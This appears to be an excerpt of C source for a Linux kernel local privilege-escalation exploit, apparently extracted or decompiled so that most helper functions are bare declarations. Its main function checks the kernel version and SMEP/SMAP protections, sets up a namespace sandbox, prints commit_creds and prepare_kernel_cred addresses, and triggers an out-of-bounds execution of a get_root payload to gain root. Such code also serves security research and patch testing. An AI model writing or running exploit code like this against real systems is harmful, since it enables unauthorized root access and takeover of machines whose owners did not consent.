
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int COMMIT_CREDS ;
 int KERNEL_BASE ;
 int PREPARE_KERNEL_CRED ;
 char* SHELL ;
 unsigned long XCHG_EAX_ESP_RET ;
 int check_root () ;
 int check_smep_smap () ;
 int detect_kernel () ;
 int dprintf (char*,...) ;
 int get_kernel_addr () ;
 int get_root ;
 int mmap_stack () ;
 int oob_execute (unsigned long) ;
 int setup_sandbox () ;

int main(int argc, char** argv) {
 if (argc > 1) SHELL = argv[1];

 dprintf("[.] starting\n");

 dprintf("[.] checking kernel version\n");
 detect_kernel();
 dprintf("[~] done, version looks good\n");

 dprintf("[.] checking SMEP and SMAP\n");
 check_smep_smap();
 dprintf("[~] done, looks good\n");

 dprintf("[.] setting up namespace sandbox\n");
 setup_sandbox();
 dprintf("[~] done, namespace sandbox set up\n");







 dprintf("[.] commit_creds:        %lx\n", COMMIT_CREDS);
 dprintf("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);

 unsigned long payload = (unsigned long)&get_root;
 dprintf("[.] executing payload %lx\n", payload);
 oob_execute(payload);
 dprintf("[~] done, should be root now\n");

 check_root();

 return 0;
}
